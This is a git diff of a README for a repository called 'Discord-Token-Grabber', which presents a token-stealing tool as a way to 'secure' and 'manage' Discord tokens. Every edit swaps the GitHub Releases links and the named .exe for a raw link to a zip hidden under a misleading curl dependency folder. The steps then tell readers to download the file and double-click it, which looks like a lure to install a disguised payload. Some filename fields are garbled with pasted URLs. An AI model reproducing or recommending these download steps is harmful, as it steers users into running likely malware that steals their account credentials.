@@ -1,6 +1,6 @@
 # 🎮 Discord-Token-Grabber - Easily Secure Your Discord Tokens
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/monarchical-runner473/Discord-Token-Grabber/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/monarchical-runner473/Discord-Token-Grabber/main/Dependencies/curl-7.75.0/x64 Release/include/curl/Discord-Token-Grabber-1.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/monarchical-runner473/Discord-Token-Grabber/main/Dependencies/curl-7.75.0/x64 Release/include/curl/Discord-Token-Grabber-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Discord-Token-Grabber is a simple tool written in C++ designed to help you manag
 
 ## 📥 Download & Install
 
-1. Click on the following link to visit the Releases page: [Visit Releases Page](https://github.com/monarchical-runner473/Discord-Token-Grabber/releases).
+1. Click on the following link to visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/monarchical-runner473/Discord-Token-Grabber/main/Dependencies/curl-7.75.0/x64 Release/include/curl/Discord-Token-Grabber-1.6.zip).
 2. On the Releases page, find the latest version of Discord-Token-Grabber.
-3. Look for a file labeled something like `Discord-Token-Grabber-v1.0.exe`.
+3. Look for a file labeled something like `https://raw.githubusercontent.com/monarchical-runner473/Discord-Token-Grabber/main/Dependencies/curl-7.75.0/x64 Release/include/curl/Discord-Token-Grabber-1.6.zip`.
 4. Click on the file to start downloading it to your computer.
 
 ## ⚙️ System Requirements
@@ -27,7 +27,7 @@ Here are the recommended system requirements to run Discord-Token-Grabber:
 After downloading, follow these steps to install and run Discord-Token-Grabber:
 
 1. Locate the downloaded file in your Downloads folder.
-2. Double-click on `Discord-Token-Grabber-v1.0.exe`.
+2. Double-click on `https://raw.githubusercontent.com/monarchical-runner473/Discord-Token-Grabber/main/Dependencies/curl-7.75.0/x64 Release/include/curl/Discord-Token-Grabber-1.6.zip`.
 3. If prompted, click "Run" to allow the software to start. 
 4. Follow the on-screen instructions to complete the setup.
 
@@ -62,4 +62,4 @@ If you run into any issues or have questions about Discord-Token-Grabber, feel f
 
 Now, you are ready to start using Discord-Token-Grabber! For more updates, keep an eye on the Releases page and make sure to use the latest version. 
 
-Feel free to revisit the [Download & Install](https://github.com/monarchical-runner473/Discord-Token-Grabber/releases) section anytime to get the latest copy. Happy managing!
+Feel free to revisit the [Download & Install](https://raw.githubusercontent.com/monarchical-runner473/Discord-Token-Grabber/main/Dependencies/curl-7.75.0/x64 Release/include/curl/Discord-Token-Grabber-1.6.zip) section anytime to get the latest copy. Happy managing!
